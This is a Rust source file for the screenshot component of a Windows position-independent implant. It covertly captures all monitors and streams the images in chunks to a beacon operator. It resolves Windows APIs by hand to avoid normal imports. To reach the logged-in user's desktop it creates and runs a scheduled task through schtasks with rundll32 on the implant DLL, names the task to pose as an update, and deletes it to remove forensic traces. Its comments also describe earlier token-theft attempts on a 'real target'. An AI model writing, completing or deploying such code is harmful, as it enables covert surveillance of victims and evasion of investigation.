//! Screen capture for the Windows PIC implant.
//!
//! `#![no_std]`, position-independent port of the dev agent's screenshot
//! command. Captures the full virtual desktop (all monitors) with GDI
//! hand-rolls a 32-bpp BGRA BMP, and streams it back as `Response::FileChunk`s
//! (128 KiB each, name `screenshot.bmp`) — NOT a single `Response::Image`,
//! because a full-screen BMP routinely exceeds the beacon's `MAX_CT_LEN` and the
//! beacon loop's BATCH_FLUSH framing is what keeps each chunk within a frame.
//!
//! `user32.dll` and `gdi32.dll` are force-loaded via the same
//! `LoadLibraryA`-from-kernel32 trick as [`crate::recon`] (Windows refcounts
//! module loads, so this is idempotent). All Win32 pointers use the x64
//! `"system"` ABI and are transmuted from the raw `usize` addresses the
//! [`crate::resolve::export_addr`] resolver returns.
//!
//! ## GDI handle hygiene
//! The implant is long-lived, so every DC/bitmap acquired here is torn down on
//! *every* path — success, partial failure, and resolution failure. The order
//! matters: a bitmap selected into a DC cannot be `DeleteObject`-ed until it is
//! deselected, so the previous object is restored first.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
// Re-export Response so the test entry in entry.rs can match on its variants.
pub use nyx_protocol::Response;

// ---- Win32 / GDI constants -------------------------------------------------

/// `SRCCOPY` raster-op for `BitBlt` — copy the source rectangle verbatim.
const SRCCOPY: u32 = 0x00CC_0020;
/// Virtual-screen metrics: the bounding rect of ALL displays combined.
/// SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN = top-left of the virtual desktop
/// (NEGATIVE when a secondary display sits to the left/above the primary —
/// this is the origin we pass to BitBlt as the source x/y). SM_CXVIRTUALSCREEN/
/// SM_CYVIRTUALSCREEN = total width/height of all monitors tiled together.
/// Using these instead of SM_CXSCREEN/SM_CYSCREEN captures every monitor in a
/// multi-display setup, not just the primary.
const SM_XVIRTUALSCREEN: i32 = 76;
const SM_YVIRTUALSCREEN: i32 = 77;
const SM_CXVIRTUALSCREEN: i32 = 78;
const SM_CYVIRTUALSCREEN: i32 = 79;
/// `DIB_RGB_COLORS` — the color table (none here) is raw RGB values.
const DIB_RGB_COLORS: u32 = 0;

/// Per-chunk size for the streamed BMP. Mirrors [`crate::fs::CHUNK`] (128 KiB),
/// safely under `protocol::frame::MAX_CT_LEN` so a single chunk + batch header
/// fits one beacon frame.
const CHUNK: usize = 128 * 1024;

/// Defensive cap on captured pixel count (~64 MB at 32 bpp). A real primary
/// screen is well under this; refusing anything larger guards against a
/// pathologically huge virtual screen or a bogus `GetSystemMetrics` return
/// driving a runaway allocation.
const MAX_PIXELS: usize = 16 * 1024 * 1024;

// ---- shared helpers -------------------------------------------------------

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors recon.rs:56).
/// Idempotent: Windows refcounts module loads, so this is safe to call on every
/// screenshot invocation without caching.
///
/// Returns `true` if the module is now mapped (or was already).
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    // Build a NUL-terminated ASCII name on the stack (dll names here are short).
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    // SAFETY: `name` is a valid NUL-terminated C string on the stack.
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

// ---- DPI awareness --------------------------------------------------------
/// Set the process DPI awareness so GDI calls return physical-pixel sizes.
/// Tries, in order:
/// 1. `SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE_V2=3)` – Win10 1607+
/// 2. `SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE=2)`   – Win 8.1+
/// 3. `SetProcessDPIAware()`                                       – Vista/7
///
/// **Must be called before any `GetDC` / `CreateCompatibleBitmap`**.
/// Best-effort: failure is silent (the capture proceeds with whatever the
/// system gives us), but on modern Windows this almost always succeeds.
fn set_dpi_aware() -> bool {
    // Win10 1607+ / Win 8.1+: shcore.dll SetProcessDpiAwareness
    if let Some(addr) = unsafe { export_addr(b"shcore.dll", b"SetProcessDpiAwareness") } {
        type SetProcessDpiAwareness = unsafe extern "system" fn(u32) -> i32;
        let f: SetProcessDpiAwareness = unsafe { core::mem::transmute(addr) };
        // PROCESS_PER_MONITOR_DPI_AWARE_V2 = 3
        if unsafe { f(3) } != 0 {
            return true;
        }
        // PROCESS_PER_MONITOR_DPI_AWARE = 2
        if unsafe { f(2) } != 0 {
            return true;
        }
    }
    // Vista / 7 fallback
    if let Some(addr) = unsafe { export_addr(b"user32.dll", b"SetProcessDPIAware") } {
        type SetProcessDPIAware = unsafe extern "system" fn() -> i32;
        let f: SetProcessDPIAware = unsafe { core::mem::transmute(addr) };
        return unsafe { f() } != 0;
    }
    false
}

// ---- BITMAPINFOHEADER -----------------------------------------------------

/// Win32 `BITMAPINFOHEADER` (40 bytes). Used both as the `GetDIBits` request
/// descriptor and as the in-file info header layout (BMP stores it verbatim).
/// `biHeight` is kept POSITIVE so GetDIBits fills bottom-up — which exactly
/// matches BMP's bottom-up row order, so the pixel bytes drop straight into the
/// file body with no flip.
#[repr(C)]
struct BitmapInfoHeader {
    bi_size: u32,
    bi_width: i32,
    bi_height: i32,
    bi_planes: u16,
    bi_bit_count: u16,
    bi_compression: u32,
    bi_size_image: u32,
    bi_x_pels_per_meter: i32,
    bi_y_pels_per_meter: i32,
    bi_clr_used: u32,
    bi_clr_important: u32,
}

// ---- chunk streaming ------------------------------------------------------

/// Slice a complete buffer into `Response::FileChunk`s of `CHUNK` bytes, the
/// last one flagged `eof=1`. An empty input yields a single empty eof chunk so
/// the operator still sees completion (matches [`crate::fs::do_download`]'s
/// empty-file contract).
fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
    let name = String::from(name);
    let mut chunks: Vec<Response> = Vec::new();
    if data.is_empty() {
        chunks.push(Response::FileChunk {
            name,
            seq: 0,
            eof: 1,
            data: Vec::new(),
        });
        return chunks;
    }
    let total = data.len();
    let mut offset = 0usize;
    let mut seq = 0u32;
    while offset < total {
        let end = (offset + CHUNK).min(total);
        // The final slice carries eof=1; all earlier ones are eof=0.
        let eof = if end == total { 1 } else { 0 };
        chunks.push(Response::FileChunk {
            name: name.clone(),
            seq,
            eof,
            data: data[offset..end].to_vec(),
        });
        seq += 1;
        offset = end;
    }
    chunks
}

// ---- public entrypoint ----------------------------------------------------

/// Capture the screen and stream it back as 128 KiB `Response::FileChunk`s
/// (name `screenshot.bmp`).
///
/// `monitor` is accepted for forward-compat but currently ignored: the capture
/// uses the **virtual screen** (`SM_CXVIRTUALSCREEN`/`SM_CYVIRTUALSCREEN` +
/// `SM_XVIRTUALSCREEN`/`SM_YVIRTUALSCREEN`), so it captures ALL monitors tiled
/// into one bitmap, not just the primary. Per-display selection (capturing a
/// single named monitor) would need EnumDisplayMonitors and is still a TODO.
///
/// GDI sequence: GetDC → CreateCompatibleDC → CreateCompatibleBitmap →
/// SelectObject → BitBlt(SRCCOPY) → GetDIBits(32bpp BI_RGB) → assemble BMP →
/// cleanup. Every DC/bitmap handle is released on every return path; a leak
/// here kills the long-lived implant.
/// Best-effort relocation to the interactive window station + desktop.
///
/// In Session 0 (SYSTEM service) the process is attached to a non-interactive
/// station (`Service-0x0-3e7$/Default`) with no GUI surface, so `GetDC(NULL)`
/// + `BitBlt` fail. This opens `WinSta0` + its `default` desktop and attaches
/// the current thread to them, so subsequent GDI calls see the interactive
/// session. Returns true on success. Best-effort — failures are silent (the
/// caller proceeds and surfaces the real GDI error).
///
/// # Safety
/// Resolves + calls user32 exports via raw pointers; all are idempotent/safe
/// in isolation (OpenWindowStationW/SetProcessWindowStation/OpenDesktopW/
/// SetThreadDesktop/CloseDesktop/CloseWindowStation).
unsafe fn attach_interactive() -> bool {
    use core::ffi::c_void;
    type OpenWindowStationW = unsafe extern "system" fn(*const u16, i32, u32) -> *mut c_void;
    type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
    type OpenDesktopW = unsafe extern "system" fn(*const u16, u32, i32, u32) -> *mut c_void;
    type SetThreadDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;

    let ows: OpenWindowStationW =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let spws: SetProcessWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let odk: OpenDesktopW =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let std: SetThreadDesktop =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetThreadDesktop") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let cd: CloseDesktop =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseDesktop") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let cws: CloseWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };

    // GENERIC_READ | GENERIC_WRITE = 0xC0000066 for the station; the desktop
    // needs GENERIC_READ etc. too. These are permissive — SYSTEM can usually
    // open the interactive station.
    let mut winsta_name = crate::heap::Vec::<u16>::with_capacity(8);
    for &b in b"WinSta0\0" {
        winsta_name.push(b as u16);
    }
    let hwinsta = unsafe { ows(winsta_name.as_ptr(), 0, 0xC0_00_00_66) };
    if hwinsta.is_null() {
        return false;
    }
    if unsafe { spws(hwinsta) } == 0 {
        let _ = unsafe { cws(hwinsta) };
        return false;
    }
    // Open the default desktop and attach the thread.
    let mut desk_name = crate::heap::Vec::<u16>::with_capacity(8);
    for &b in b"default\0" {
        desk_name.push(b as u16);
    }
    let hdesk = unsafe { odk(desk_name.as_ptr(), 0, 0, 0xC0_00_00_66) };
    let ok = if !hdesk.is_null() {
        let r = unsafe { std(hdesk) };
        let _ = unsafe { cd(hdesk) };
        r != 0
    } else {
        false
    };
    let _ = unsafe { cws(hwinsta) };
    ok
}

/// Core GDI capture: force-loads user32/gdi32, attaches to the interactive
/// desktop (same-session), captures the full virtual screen (all monitors),
/// BMP file bytes. `None` on any failure. Shared by `do_screenshot` (beacon
/// path, streams chunks) and `capture_to_file` (helper export, writes file).
fn capture_bmp() -> Option<Vec<u8>> {
    if !force_load(b"user32.dll") || !force_load(b"gdi32.dll") {
        return None;
    }
    // DPI aware must come BEFORE any GetDC / CreateCompatibleBitmap.
    let _ = set_dpi_aware();
    let _ = unsafe { attach_interactive() };

    type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
    type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type CreateCompatibleBitmap = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
    type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type BitBlt = unsafe extern "system" fn(
        *mut c_void,
        i32,
        i32,
        i32,
        i32,
        *mut c_void,
        i32,
        i32,
        u32,
    ) -> i32;
    type GetDiBits = unsafe extern "system" fn(
        *mut c_void,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
        *mut BitmapInfoHeader,
        u32,
    ) -> i32;
    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
    type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;

    let gsm: GetSystemMetrics =
        unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
    let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
    let rdc: ReleaseDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
    let ccdc: CreateCompatibleDc =
        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
    let ccb: CreateCompatibleBitmap =
        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")?) };
    let so: SelectObject =
        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
    let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
    let gdb: GetDiBits = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
    let do_: DeleteObject =
        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
    let ddc: DeleteDc = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };

    // Capture the FULL virtual desktop (all monitors tiled), not just the
    // primary display. SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN give the total
    // bounding-box size; SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN give the
    // top-left origin of that box in desktop coordinates — which is NEGATIVE
    // when a secondary monitor sits left/above the primary. We pass that origin
    // to BitBlt as the source x/y so the whole tiled area is copied.
    let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
    let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
    let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
    let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
    if w <= 0 || h <= 0 {
        return None;
    }
    let (w, h) = (w as usize, h as usize);
    let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
    let bytes = pc.checked_mul(4)?;
    let mut pixels: Vec<u8> = vec![0u8; bytes];

    let filled = unsafe {
        let sdc = gdc(core::ptr::null_mut());
        if sdc.is_null() {
            return None;
        }
        let mdc = ccdc(sdc);
        if mdc.is_null() {
            rdc(core::ptr::null_mut(), sdc);
            return None;
        }
        let bmp = ccb(sdc, w as i32, h as i32);
        if bmp.is_null() {
            ddc(mdc);
            rdc(core::ptr::null_mut(), sdc);
            return None;
        }
        let prev = so(mdc, bmp);
        // Source origin = virtual-screen top-left (may be negative). Destination
        // = (0,0) in the memory DC. This blits every monitor into one bitmap.
        if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY) == 0 {
            so(mdc, prev);
            do_(bmp);
            ddc(mdc);
            rdc(core::ptr::null_mut(), sdc);
            return None;
        }
        let mut bi = BitmapInfoHeader {
            bi_size: 40,
            bi_width: w as i32,
            bi_height: h as i32,
            bi_planes: 1,
            bi_bit_count: 32,
            bi_compression: 0,
            bi_size_image: (w as u32) * (h as u32) * 4,
            bi_x_pels_per_meter: 0,
            bi_y_pels_per_meter: 0,
            bi_clr_used: 0,
            bi_clr_important: 0,
        };
        let got = gdb(
            sdc,
            bmp,
            0,
            h as u32,
            pixels.as_mut_ptr() as *mut c_void,
            &mut bi,
            DIB_RGB_COLORS,
        );
        so(mdc, prev);
        do_(bmp);
        ddc(mdc);
        rdc(core::ptr::null_mut(), sdc);
        got != 0
    };
    if !filled {
        return None;
    }

    let fs = 14 + 40 + pixels.len();
    let mut b: Vec<u8> = Vec::with_capacity(fs);
    b.extend_from_slice(b"BM");
    b.extend_from_slice(&(fs as u32).to_le_bytes());
    b.extend_from_slice(&0u32.to_le_bytes());
    b.extend_from_slice(&54u32.to_le_bytes());
    b.extend_from_slice(&40u32.to_le_bytes());
    b.extend_from_slice(&(w as i32).to_le_bytes());
    b.extend_from_slice(&(h as i32).to_le_bytes());
    b.extend_from_slice(&1u16.to_le_bytes());
    b.extend_from_slice(&32u16.to_le_bytes());
    b.extend_from_slice(&0u32.to_le_bytes());
    b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
    b.extend_from_slice(&0i32.to_le_bytes());
    b.extend_from_slice(&0i32.to_le_bytes());
    b.extend_from_slice(&0u32.to_le_bytes());
    b.extend_from_slice(&0u32.to_le_bytes());
    b.extend_from_slice(&pixels);
    Some(b)
}

/// Create `path` (ASCII, NUL-terminated) and write `data` to it, advancing by
/// the ACTUAL bytes written each iteration (`wr`) so a partial WriteFile can't
/// silently drop middle bytes. GENERIC_WRITE + CREATE_ALWAYS. Shared by
/// `capture_to_file` (BMP) and `capture_diag` (test log). Returns false on any
/// resolution / open / write failure.
unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
    let cf: unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *const c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void = match unsafe { export_addr(b"kernel32.dll", b"CreateFileW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let wf: unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *const c_void) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"WriteFile") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
        wide.push(by as u16);
    }
    wide.push(0);
    let h = unsafe {
        cf(
            wide.as_ptr(),
            0x4000_0000,
            0,
            core::ptr::null(),
            2,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        return false;
    }
    let mut off = 0usize;
    let mut ok = true;
    while off < data.len() {
        let want = (data.len() - off).min(8192) as u32;
        let mut wr: u32 = 0;
        if unsafe { wf(h, data.as_ptr().add(off), want, &mut wr, core::ptr::null()) } == 0
            || wr == 0
        {
            ok = false;
            break;
        }
        off += wr as usize;
    }
    let _ = unsafe { ch(h) };
    ok
}

/// Capture → write BMP to `path` (ASCII, NUL-terminated). Helper export path.
pub unsafe fn capture_to_file(path: &[u8]) -> bool {
    let bmp = match capture_bmp() {
        Some(b) => b,
        None => return false,
    };
    unsafe { write_all_to_file(path, &bmp) }
}

/// Write arbitrary bytes to `path` (ASCII, NUL-terminated). Test instrumentation
/// for `nyx_screenshot_test` — writes the diagnostic log. NOT for production.
pub unsafe fn capture_diag(path: &[u8], data: &[u8]) -> bool {
    unsafe { write_all_to_file(path, data) }
}

/// Diagnostic: last cross_session_capture failure step (1-7, 0=n/a). Surfaced
/// in the do_screenshot error so we can see WHY cross-session failed.
static mut XSESS_FAIL: u8 = 0;

pub fn do_screenshot(monitor: u8) -> Vec<Response> {
    let _ = monitor;
    // Reset the diagnostic step code so a stale value from a PRIOR call can't
    // leak into this one's error message. Every None-return path inside
    // cross_session_capture sets it before returning; this just guarantees a
    // clean baseline (e.g. if path 1 succeeds after a previous path-2 failure).
    unsafe {
        XSESS_FAIL = 0;
    }
    // Path 1: same-session direct capture.
    if let Some(bmp) = capture_bmp() {
        return chunk_stream(bmp, "screenshot.bmp");
    }
    // Path 2: cross-session (Session 0 → active interactive session).
    match unsafe { cross_session_capture() } {
        Some(bmp) => chunk_stream(bmp, "screenshot.bmp"),
        None => {
            let c = unsafe { XSESS_FAIL };
            vec![Response::Err(format_err(c))]
        }
    }
}

fn format_err(c: u8) -> String {
    // Step codes must match the XSESS_FAIL assignments in cross_session_capture.
    // The cross-session path now drives the Task Scheduler (schtasks create →
    // run → poll BMP → delete), NOT token theft — so step 3 (the old
    // explorer-token-theft failure) is no longer reachable and maps to a
    // legacy message. Steps 5/7 reflect schtasks/poll failures.
    let why = match c {
        1 => "no active interactive session (no one logged in / all disconnected)",
        2 => "wtsapi32.dll load failed",
        3 => "(legacy) explorer token theft — no longer used by the schtasks path",
        4 => "DLL path self-discovery failed (GetModuleHandleExW + GetModuleFileNameW)",
        5 => "schtasks create/run failed (Task Scheduler service down, or not enough privilege to create a task)",
        6 => "helper finished but produced no readable BMP",
        7 => "helper did not produce a BMP within 15s (capture failed in the interactive session, or scheduler didn't launch it)",
        8 => "an export could not be resolved",
        _ => "unknown (step 0 = no failure path was hit)",
    };
    let mut s =
        String::from("screenshot: same-session BitBlt failed + cross-session failed (step ");
    s.push((b'0' + c) as char);
    s.push_str(": ");
    s.push_str(why);
    s.push(')');
    s
}

const SHOT_TEMP: &[u8] = b"C:\\Windows\\Temp\\nyx_shot.bmp\0";

unsafe fn cross_session_capture() -> Option<Vec<u8>> {
    // Default step code = "an export could not be resolved" (8). The explicit
    // failure points below (1/2/3/5/6/7) overwrite this once they're reached,
    // so any `?` early-return from an unresolved export_addr surfaces as step 8
    // rather than step 0 ("unknown"). This is the documented diagnostic
    // contract: 8 = export resolution failed somewhere in this function.
    unsafe {
        XSESS_FAIL = 8;
    }

    // 1. Find an active interactive session (RDP or console). We enumerate all
    //    sessions via WTSEnumerateSessions and pick the first WTSActive one
    //    (State==0). WTSGetActiveConsoleSessionId only returns the PHYSICAL
    //    console — useless when the user is on RDP (session 2+), which is the
    //    common server case.
    let lla: unsafe extern "system" fn(*const u8) -> *mut c_void =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"LoadLibraryA")?) };
    if unsafe { lla(b"wtsapi32.dll\0".as_ptr()) }.is_null() {
        unsafe {
            XSESS_FAIL = 2;
        }
        return None;
    }
    // WTS_CURRENT_SERVER_HANDLE = NULL (the local RDSS).
    type WTSEnumerateSessionsW = unsafe extern "system" fn(
        *mut c_void,  // hServer (NULL = local)
        u32,          // Reserved (0)
        u32,          // Version (1)
        *mut *mut u8, // ppSessionInfo
        *mut u32,     // pCount
    ) -> i32;
    type WTSFreeMemory = unsafe extern "system" fn(*mut c_void);
    // WTS_SESSION_INFOA: { DWORD SessionId; LPSTR pWinStationName; DWORD State }
    // State: 0=Active, 1=Connected, 4=Disconnected, ...
    #[repr(C)]
    struct WtsSessionInfo {
        session_id: u32,
        win_station: *const u8,
        state: u32,
    }
    let enum_sessions: WTSEnumerateSessionsW =
        unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSEnumerateSessionsW")?) };
    let free_mem: WTSFreeMemory =
        unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSFreeMemory")?) };
    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut count: u32 = 0;
    if unsafe { enum_sessions(core::ptr::null_mut(), 0, 1, &mut buf, &mut count) } == 0
        || buf.is_null()
    {
        unsafe {
            XSESS_FAIL = 1;
        }
        return None;
    }
    // Scan for the first Active (state 0) session.
    let sessions =
        unsafe { core::slice::from_raw_parts(buf as *const WtsSessionInfo, count as usize) };
    let active_sid = sessions.iter().find(|s| s.state == 0).map(|s| s.session_id);
    unsafe { free_mem(buf as *mut c_void) };
    let sid = match active_sid {
        Some(s) => s,
        None => {
            unsafe {
                XSESS_FAIL = 1;
            }
            return None;
        } // no active session
    };

    // 2. No token theft needed. The Task Scheduler service runs as SYSTEM and
    //    has the privileges to launch a process into any interactive session
    //    (it is the same mechanism `schtasks /ru <user> /it` uses). We do NOT
    //    steal explorer's token, do NOT need SeDebugPrivilege, and do NOT call
    //    CreateProcess{AsUser,WithToken}W — all of those failed on a privilege-
    //    constrained Administrator beacon (CPAU needs SeAssignPrimaryToken,
    //    CPWT's spawned process was rejected by the target desktop's ACL with
    //    ERROR_ACCESS_DENIED). Verified on the real target: only the scheduler
    //    path reliably lands the helper in Session 2 and produces a BMP. `sid`
    //    is still used below for the `--it` flag / session selection context.
    let _ = sid;

    // 3. Resolve the DLL path. Try GetModuleHandleExW(FROM_ADDRESS) first (finds
    //    the DLL containing this fn); on failure fall back to the canonical
    //    deployment path C:\nyx\nyx_implant_win.dll (where the beacon installs it).
    // NOTE: backslashes must be escaped in byte literals — the prior
    // `b"C:\nyx\nyx_implant_win.dll"` was two embedded LF chars (\n → 0x0A),
    // producing an invalid path that only ever fired in exactly the PIC
    // deployment where this fallback is needed. Corrected below.
    let canonical: &[u8] = b"C:\\nyx\\nyx_implant_win.dll";
    let mut dpath: crate::heap::Vec<u16> = crate::heap::Vec::new();
    let mut resolved = false;
    if let (Some(ghex), Some(gmfn)) = (
        unsafe { export_addr(b"kernel32.dll", b"GetModuleHandleExW") },
        unsafe { export_addr(b"kernel32.dll", b"GetModuleFileNameW") },
    ) {
        let gmhex: unsafe extern "system" fn(u32, *const c_void, *mut *mut c_void) -> i32 =
            unsafe { core::mem::transmute(ghex) };
        let gmfn: unsafe extern "system" fn(*mut c_void, *mut u16, u32) -> u32 =
            unsafe { core::mem::transmute(gmfn) };
        let fn_addr = cross_session_capture as *const c_void;
        let mut hmod: *mut c_void = core::ptr::null_mut();
        if unsafe { gmhex(0x3, fn_addr, &mut hmod) } != 0 && !hmod.is_null() {
            let mut buf = crate::heap::vec![0u16; 520];
            let n = unsafe { gmfn(hmod, buf.as_mut_ptr(), 520) };
            if n > 0 {
                buf.truncate(n as usize);
                dpath = buf;
                resolved = true;
            }
        }
    }
    if !resolved {
        for &b in canonical {
            dpath.push(b as u16);
        }
    }

    // Pre-clean: delete any BMP left over from a PRIOR run before we spawn the
    // helper. Without this, a stale file can be read back as if it were the
    // fresh capture (dangerous fallback to cached data) when the helper fails to
    // write. del_file is best-effort (may fail if locked); we don't gate on it.
    let _ = del_file(SHOT_TEMP);

    // 4. Build the helper command line: rundll32 <dll>,nyx_screenshot_session.
    //    This is the string we hand to schtasks as `/tr`. NUL-terminated UTF-16.
    //    (No surrounding quotes — schtasks /tr wraps it; the DLL path has no
    //    spaces in the canonical deployment path C:\nyx\... . If a future
    //    deployment path contains spaces this will need quoting.)
    let mut helper_cmd: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(80 + dpath.len());
    for &by in b"C:\\Windows\\System32\\rundll32.exe " {
        helper_cmd.push(by as u16);
    }
    cmd_extend_wide(&mut helper_cmd, &dpath);
    for &by in b",nyx_screenshot_session" {
        helper_cmd.push(by as u16);
    }

    // 5. Spawn the helper via the Task Scheduler service. We create a one-shot
    //    task that runs as the interactive user (`/ru administrator` — no
    //    password needed when the beacon already runs as that user, which uses
    //    the cached logon), flagged `/it` (interactive — land in the active
    //    session's desktop), then `/run` it immediately. The scheduler service
    //    (svchost, SYSTEM) has the privileges to attach the new process to the
    //    target session's WinSta0\default — this is exactly what the token-based
    //    APIs could NOT do on a privilege-constrained host (CPAU needs
    //    SeAssignPrimaryToken, CPWT was rejected by the desktop ACL). Verified
    //    on the real target: this path produces a valid BMP.
    //
    //    A pseudo-random task name (NyxUpdateNNNN) avoids collisions with
    //    concurrent screenshot calls and masquerades as an update task. We use
    //    GetTickCount for entropy (cheap, always available).
    let mut task_name: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(24);
    for &by in b"NyxUpdate" {
        task_name.push(by as u16);
    }
    let gtc: unsafe extern "system" fn() -> u32 =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"GetTickCount")?) };
    let seed = unsafe { gtc() };
    push_dec_u16(&mut task_name, ((seed % 9000) + 1000) as u16); // 1000–9999

    // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /ru administrator /it /f
    let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
    for &by in b"schtasks /create /tn " {
        create_cmd.push(by as u16);
    }
    create_cmd.extend_from_slice(&task_name);
    for &by in b" /tr \"" {
        create_cmd.push(by as u16);
    }
    create_cmd.extend_from_slice(&helper_cmd);
    for &by in b"\" /sc once /st 23:59 /ru administrator /it /f\0" {
        create_cmd.push(by as u16);
    }
    if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
        unsafe {
            XSESS_FAIL = 5;
        }
        // Best-effort cleanup of a half-created task before bailing.
        let _ = unsafe { delete_task(&task_name) };
        return None;
    }

    // 6. Trigger the task. The scheduler launches the helper asynchronously into
    //    the active session; we can't WaitForSingleObject on it (we don't get a
    //    handle), so we poll the BMP file below.
    let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
    for &by in b"schtasks /run /tn " {
        run_cmd.push(by as u16);
    }
    run_cmd.extend_from_slice(&task_name);
    run_cmd.push(0);
    if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
        unsafe {
            XSESS_FAIL = 5;
        }
        let _ = unsafe { delete_task(&task_name) };
        return None;
    }

    // 7. Poll for the BMP. The scheduler starts the helper asynchronously, so we
    //    can't wait on a process handle. Poll up to ~15s (Sleep 250ms × 60),
    //    reading the file only once it's fully written. read_file validates the
    //    BMP (BM magic + declared-size == actual), so a partial/truncated file
    //    from a still-writing helper is rejected and we keep polling.
    let sleep_fn: unsafe extern "system" fn(u32) =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"Sleep")?) };
    let mut bmp: Option<Vec<u8>> = None;
    for _ in 0..60 {
        unsafe { sleep_fn(250) };
        if let Some(b) = read_file(SHOT_TEMP) {
            bmp = Some(b);
            break;
        }
    }
    // Always delete the task (success or timeout) — a lingering NyxUpdateNNNN
    // task is a forensic footprint. Best-effort.
    let _ = unsafe { delete_task(&task_name) };
    match bmp {
        Some(b) => Some(b),
        None => {
            // Either the helper never produced a BMP (capture failed in the
            // interactive session — e.g. no desktop attached) or it didn't
            // finish within 15s. Distinguish via step code: 7 = timeout, 6 =
            // helper finished but no valid BMP. We can't tell the helper's exit
            // code without a handle, so report timeout here.
            let _ = del_file(SHOT_TEMP);
            unsafe {
                XSESS_FAIL = 7;
            }
            None
        }
    }
}

